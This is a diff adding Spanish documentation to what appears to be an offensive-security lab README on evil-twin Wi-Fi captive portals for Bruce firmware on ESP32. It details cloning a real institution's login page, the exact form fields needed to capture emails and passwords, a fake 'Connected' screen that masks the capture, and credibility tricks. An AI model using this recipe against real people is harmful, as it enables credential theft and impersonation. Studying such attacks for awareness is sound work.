@@ -94,7 +94,110 @@ Las capturas documentan el flujo completo del ataque: desde la pantalla del disp
 > ![Portal NODO-WIFI - diseño ficticio de conferencia](screenshots/nodo_wifi_portal_preview.png)
 
 ---
+# 🧩 Documentación Técnica de Portales
 
+
+## 📐 Arquitectura
+
+Los portales comparten la misma arquitectura de tres bloques, que es el patrón funcional validado para Bruce:
+
+```
+┌─────────────────────────────────┐
+│  <!-- AP="Nombre Red" -->        │  ← Directiva Bruce: define el SSID del AP
+│  <div id="form-block">           │  ← Bloque 1: formulario visible al cargar
+│    <form action="/post">         │  ← Endpoint nativo de captura en Bruce
+│      name="email"                │  ← Campo obligatorio (contrato Bruce)
+│      name="password"             │  ← Campo obligatorio (contrato Bruce)
+│    </form>                       │
+│  </div>                          │
+│  <div id="success-block">        │  ← Bloque 2: pantalla post-submit (oculta)
+│    animación WiFi + barra        │
+│  </div>                          │
+│  <script>                        │  ← Bloque 3: lógica de intercambio
+│    preventDefault →              │
+│    mostrar success →             │
+│    setTimeout 3s →               │
+│    form.submit() real            │  ← Submit real a Bruce al final
+│  </script>                       │
+└─────────────────────────────────┘
+```
+
+**Por qué este patrón y no otro:** Bruce sirve un servidor HTTP mínimo sobre ESP32. El submit directo del formulario no da tiempo de mostrar feedback al usuario. El patrón `preventDefault → animación → setTimeout(3000) → submit real` resuelve esto: el usuario ve una pantalla de "Conectado" mientras Bruce procesa la captura en background.
+
+---
+
+## 🟡 Portal — ITSE Institucional Clone
+
+**Archivo:** `portals/wifi-itse_login-PRO.html`
+**AP Name:** `Conferencia ITSE 2026`
+**Paleta:** Amarillo institucional `#F5A800` sobre blanco
+
+### Decisiones de diseño
+
+El portal replica la identidad visual del ITSE con tres elementos clave: el logotipo textual en amarillo `#F5A800` que coincide con los colores reales de la institución, el subtítulo "Educación Superior de Ciclo Corto" que es el descriptor oficial, y el badge de red con animación de parpadeo que simula actividad de conexión real.
+
+```html
+<!-- Directiva Bruce — primera línea del archivo, obligatoria -->
+<!-- AP="Conferencia ITSE 2026" -->
+
+<!-- Badge animado que simula señal activa -->
+<div class="wifi-badge">
+  <svg><!-- ícono WiFi SVG inline — sin dependencias externas --></svg>
+  <span class="dot"></span>  <!-- punto parpadeante CSS puro -->
+  ITSE 2026
+</div>
+```
+
+El punto parpadeante (`.dot`) está implementado en CSS con `@keyframes blink` — sin JavaScript, sin librerías. Esto es deliberado: cada KB de JS adicional incrementa el tiempo de carga sobre el servidor HTTP del ESP32.
+
+### Formulario y captura
+
+```html
+<form action="/post" id="login-form">
+  <input type="text"     name="email"    placeholder="Correo electronico institucional">
+  <input type="password" name="password" placeholder="Contrasena">
+</form>
+```
+
+Los campos `name="email"` y `name="password"` son literales requeridos por el handler de Bruce. Cualquier otro nombre produce una captura vacía sin mensaje de error, lo cual fue uno de los hallazgos más relevantes del laboratorio.
+
+
+
+Los 3000ms de delay no son arbitrarios: coinciden exactamente con el tiempo que tarda la barra de progreso en completarse (30ms × 100 incrementos), garantizando que el submit ocurra cuando la barra llegó al 100%.
+
+### Toggle de contraseña
+
+```javascript
+// Ícono de ojo — alterna entre mostrar/ocultar password
+toggleBtn.addEventListener('click', function() {
+  visible = !visible;
+  passInput.type = visible ? 'text' : 'password';
+  // Reemplaza el SVG inline directamente — sin DOM adicional
+  eyeIcon.innerHTML = visible ? '<!-- ojo abierto -->' : '<!-- ojo tachado -->';
+});
+```
+
+Este componente mejora la credibilidad del portal: los usuarios esperan este comportamiento en formularios legítimos. Su ausencia genera desconfianza.
+
+---
+
+
+## ⚙️ Reglas Técnicas Validadas (Bruce Firmware)
+
+Durante el desarrollo de ambos portales se identificaron y documentaron las siguientes restricciones del firmware:
+
+| Regla | Correcto | Incorrecto |
+|---|---|---|
+| Primera línea del archivo | `<!-- AP="Nombre" -->` | Cualquier otra cosa |
+| Atributo `action` del form | `action="/post"` | `action="/"` o cualquier otra ruta |
+| Atributo `method` del form | **Omitido** | `method="POST"` o `method="GET"` |
+| Campo de usuario | `name="email"` | `name="user"`, `name="username"` |
+| Campo de contraseña | `name="password"` | `name="pass"`, `name="passwd"` |
+| Patrón JS submit | `preventDefault → style.display → setTimeout → submit()` | Submit directo o con clases CSS |
+| Recursos externos | **Ninguno** | Google Fonts, CDN, imágenes externas |
+| Tamaño máximo del archivo | ~14 KB | Archivos más grandes pueden no cargar |
+
+---
 ## 🗂️ Campañas Documentadas
 
 ### Campaña 1 — ITSE Institucional Clone
@@ -222,3 +325,14 @@ Este repositorio documenta un laboratorio de ciberseguridad ofensiva realizado c
 [RFC 6585 — Additional HTTP Status Codes (captive portals)](https://datatracker.ietf.org/doc/html/rfc6585)
 [Wi-Fi Alliance — Hotspot 2.0 y mitigaciones de captive portals](https://www.wi-fi.org/discover-wi-fi/passpoint)
 [ESP32 Arduino HTTP Server — Documentación](https://github.com/espressif/arduino-esp32)
+
+
+
+
+
+
+
+
+
+
+
